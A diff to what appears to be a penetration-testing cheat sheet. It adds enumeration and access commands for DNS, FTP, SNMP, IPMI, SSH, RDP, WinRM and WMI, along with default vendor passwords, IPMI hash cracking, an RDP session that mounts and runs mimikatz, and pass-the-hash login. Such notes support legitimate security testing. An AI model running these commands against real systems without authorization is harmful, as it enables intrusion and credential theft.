@@ -101,7 +101,7 @@ for i in $(cat domain_ipaddress.txt) ; do host $i | grep "has address" | cut -d"
 # (IPv4) Addresses => Services via Shodan
 for i in $(cat ip-addresses.txt) ; do shodan host $i ; done
 
-# DNS
+# DNS: old technique
 dig any <DOMAIN>
 
 # Content Search: google.com Dork
@@ -294,14 +294,17 @@ feroxbuster -t 64 -w /usr/share/seclists/Discovery/Web-Content/common.txt --dept
 ftp -p -a <HOST>
 
 # List files and directories
-ls
-ls -R
+ls -la
+ls -laR
 
+# Read file
+get <FILENAME> -
 # Download file
 get <FILENAME>
 # Upload file
 put <FILENAME>
 # Download ALL files
+mkdir ftp_files
 wget -m --no-passive-ftp ftp://anonymous:anonymous@<TARGET>
 
 # Execute local commands (outside of session)
@@ -355,7 +358,7 @@ recurse              # Toggle directory recursion
 !<COMMAND>
 
 # SMB enumeration:
-sudo nmap -p 445 --script "smb-enum-domains,smb-os-discovery" -oA nmap_smb_domains <TARGET>
+sudo nmap -n -Pn -p 445 --script "smb-enum-domains,smb-os-discovery" -oA nmap_smb_domains <TARGET>
 
 # RPC
 rpcclient --user=<DOMAIN>/<USERNAME> --password='<PASSWORD>' <TARGET>
@@ -412,13 +415,14 @@ sudo mount -t nfs -o nolock <TARGET>:/ ./target-NFS
 sudo umount ./target-NFS
 
 # Enumerate
-sudo nmap -p111,2049 -sV -sC <TARGET>
-sudo nmap -p111,2049 -sV --script nfs* <TARGET>
+sudo nmap -n -Pn -p111,2049 -sV -sC <TARGET>
+sudo nmap -n -Pn -p111,2049 -sV --script 'nfs*' <TARGET>
 ```
 
 ## DNS
 
-- `UDP/TCP 53`: 
+- `UDP 53`: normal name queries
+- `TCP 53`: zone transfers and syncs
 - Server Config (Bind9)
     - `/etc/bind/named.conf.local`
     - `/etc/bind/named.conf.options`
@@ -437,20 +441,43 @@ sudo nmap -p111,2049 -sV --script nfs* <TARGET>
 {{% /details %}}
 
 ```bash
+# Registrar Info
+whois <DOMAIN> | whois.txt
+
 # Query Nameserver for domain
 dig @<DNS_SERVER> ns <DOMAIN>
 
-# Query Version; sometimes works
-dig CH TXT version.bind <DOMAIN>
+# PTR Record or Reverse DNS Query
+dig @<DNS_SERVER> -x <IP_ADDRESS>
 
-# Any; sometimes works
+# OLD: version / all records / zone transfer
+dig @<DNS_SERVER> CH TXT version.bind <DOMAIN>
 dig @<DNS_SERVER> ANY <DOMAIN>
-
-# RARE: zone transfer (full enumeration)
 dig @<DNS_SERVER> AXFR <DOMAIN>
+
+# --- Record Types ---
+# ANY: return all records -- sometimes doesnt work!
+# A: IPv4 address
+# AAAA: IPv6 address
+# CNAME: Canonical Name
+# MX: Mail Servers
+# NS: Name Servers
+# PTR: Pointer Record
+# SOA: Start of Authority
+# TXT: Text Records
+# SRV: Service Records
+# CAA: Certification Authority Authorization
+for type in A AAAA CNAME MX NS SOA SRV TXT CAA ; do echo '---' ; dig @<DNS_SERVER> +short $type <DOMAIN> | tee -a dns_all_records.txt ; done
+for type in A AAAA CNAME MX NS SOA SRV TXT CAA ; do echo "--- $type Records ---"; dig @<DNS_SERVER> +short $type <DOMAIN> ; done | tee dns_records.txt
 
 # Subdomain Brute-forcing
 for sub in $(cat /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt) ; do dig @<DNS_SERVER> $sub.<DOMAIN> | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt ; done
+
+# Subdomain bruteforce and more
+puredns bruteforce /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt <DOMAIN>
+
+# Subdomain bruteforce and more
+dnsenum -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --enum <DOMAIN>
 
 # /usr/share/SecLists/Discovery/DNS/namelist.txt
 gobuster --quiet --threads 64 --output gobuster_dns_top110000 dns -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r <DNS_SERVER> -d <DOMAIN>
@@ -564,14 +591,17 @@ QUIT	# Close connection
 {{% /details %}}
 
 ```bash
+# Enum via nmap
+sudo nmap -n -Pn -sU -p161 -sV --script 'snmp*' --reason -oA nmap_snmp_scan <TARGET>
+
 ### Brute-force names of Community Strings
 # - Default Strings: "public" (Read-Only) and "private" (Read/Write) are common
-onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <TARGET_IP>
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <TARGET>
 // probably "public"
 
 ### Brute-force OIDs and info
-# -v 2c
-snmpwalk -v <VERSION> -c <COMMUNITY_STRING> <TARGET_IP> .1
+# -v 1,2c,3
+snmpwalk -v <VERSION> -c <COMMUNITY_STRING> <TARGET> .1
 
 ### Brute-force OIDs
 # -2 : use v2
@@ -726,7 +756,7 @@ curl -Lo- http://<TARGET>/testing.txt
 - `UDP 623`: normal
 - Default Passwords:
     - Dell iDRAC:	`root:calvin`
-    - HP iLO: `Administrator:[randomized 8-character string consisting of numbers and uppercase letters]
+    - HP iLO: `Administrator:[randomized 8-character string consisting of numbers and uppercase letters]`
     - Supermicro IPMI: `ADMIN:ADMIN`
 
 A hardware control protocol that gives "virtual" physical access to a machine.
@@ -734,9 +764,6 @@ A hardware control protocol that gives "virtual" physical access to a machine.
 {{% details "Dangerous Settings" %}}
 
 - Server sends the salted hash of the user's password to the user before authentication
-```bash
-
-```
 
 {{% /details %}}
 
@@ -754,8 +781,141 @@ use auxiliary/scanner/ipmi/ipmi_dumphashes
 run
 
 ### Crack HP iLO format
+# https://hashcat.net/wiki/doku.php?id=example_hashes
 hashcat -m 7300 ipmi_hash.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
 hashcat -m 7300 -w 3 -O "<HASH>" /usr/share/wordlists/rockyou.txt
+```
+
+## Nix: SSH
+
+- `TCP 22`: normal
+- Server Config:
+    - `/etc/ssh/sshd_config`
+    - https://www.ssh.com/academy/ssh/sshd_config
+- Versions:
+    - v1: obselete and vuln to MITM
+    - v2: modern
+
+{{% details "Dangerous Settings" %}}
+- https://www.ssh-audit.com/hardening_guides.html
+
+| **Setting**                  | **Description**                             |
+| ---------------------------- | ------------------------------------------- |
+| `PasswordAuthentication yes` | Allows password-based authentication.       |
+| `PermitEmptyPasswords yes`   | Allows the use of empty passwords.          |
+| `PermitRootLogin yes`        | Allows to log in as the root user.          |
+| `Protocol 1`                 | Uses an outdated version of encryption.     |
+| `X11Forwarding yes`          | Allows X11 forwarding for GUI applications. |
+| `AllowTcpForwarding yes`     | Allows forwarding of TCP ports.             |
+| `PermitTunnel`               | Allows tunneling.                           |
+| `DebianBanner yes`           | Displays a specific banner when logging in. |
+{{% /details %}}
+
+```bash
+# Audit sercurity of SSH server
+# https://github.com/jtesta/ssh-audit
+git clone https://github.com/jtesta/ssh-audit.git && cd ssh-audit
+./ssh-audit.py -l warn <TARGET> | tee ssh_audit.txt
+
+# Specify auth-method: password
+ssh -v -o PreferredAuthentications=password <USER>@<TARGET>
+sshpass -p '<PASSWORD>' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 22 <USER>@<TARGET>
+
+# Force auth-method: privkey
+ssh -i <PRIVATE_KEY> <USER>@<TARGET>
+```
+
+## Nix: Rsync
+
+- `TCP 873`: normal
+- Pentesting: https://archive.ph/flPtZ
+- Rsync via `ssh`: https://phoenixnap.com/kb/how-to-rsync-over-ssh
+
+```bash
+# Enum via nmap
+sudo nmap -sV -p873 <TARGET>
+
+# Enum dir
+rsync -av --list-only rsync://<TARGET>/<DIR>
+
+# Download dir optionally via SSH
+rsync -av -e "ssh -p <SSH_PORT>" rsync://<TARGET>/<DIR>
+```
+
+## Nix: R-services
+
+- `TCP 512/513/514`: `rexecd`, `rlogind`, `rshd`
+- `UDP 513`: `rwhod`
+- https://en.wikipedia.org/wiki/Berkeley_r-commands
+- Server Config
+    - `/etc/hosts.equiv`: allowed hosts for `rlogin`
+    - `~/{.rlogin, .rhosts}`: allowed hosts
+
+Suite of obsolete remote management tools. All communication is unencrypted including its authentication.
+
+```bash
+# Enum via nmap
+sudo nmap -sV -p 512,513,514 <TARGET>
+
+# Remote copy; does not confirm remote overwriting of files
+rcp
+# Remote shell
+rsh
+# Remote command
+rexec
+# Remote login (telnet-like)
+rlogin <TARGET> -l <USER>
+# Show authenticated users
+rwho
+rusers -al <TARGET>
+```
+
+## Win: RDP
+
+- `TCP 3389`: normal
+- `UDP 3389`: automatic w/ RDP 8.0+ for performance (frames, audio, etc.)
+
+Also called "Terminal Services".
+
+```bash
+# Enum via nmap
+sudo nmap -sV -sC --script rdp* -p3389 <TARGET>
+
+# Enum RDP security posture
+sudp cpan
+sudo cpan Encoding::BER
+git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check
+./rdp-sec-check.pl <TARGET>
+
+# Connects to RDP and mounts mimikatz share
+xfreerdp3 +multitransport /clipboard /dynamic-resolution /cert:ignore /v:<TARGET> /u:<USER> /p:'<PASSWORD>' /drive:'/usr/share/windows-resources/mimikatz/x64',share
+
+\\tsclient\share\mimikatz.exe
+```
+
+## Win: WinRM
+
+- `TCP 5985/5986`: via HTTP/HTTPS respectively
+
+```bash
+# Enum via nmap
+sudo nmap --disable-arp-ping -n -sV -sC -p5985,5986 <TARGET>
+
+# Connect via WinRM
+evil-winrm -u <USER> -p <PASSWORD> -i <HOST>
+evil-winrm -u <USER> -H <PASS_HASH> -i <HOST>
+```
+
+## Win: WMI
+
+- `TCP 135`: first, initialization
+- `TCP <RHP>`: afterwards, comms
+
+```bash
+# Run interactive shell
+impacket-wmiexec <USER>:"<PASSWORD>"@<TARGET>
+# Run remote command
+impacket-wmiexec <USER>:"<PASSWORD>"@<TARGET> "<COMMAND>"
 ```
 
 # Exploitation
@@ -933,3 +1093,4 @@ for %f in ("C:\Program Files", "C:\Program Files (x86)") do @(echo. && echo --- 
 # Proof-of-Concept/Reporting
 
 # Post-Engagement
+
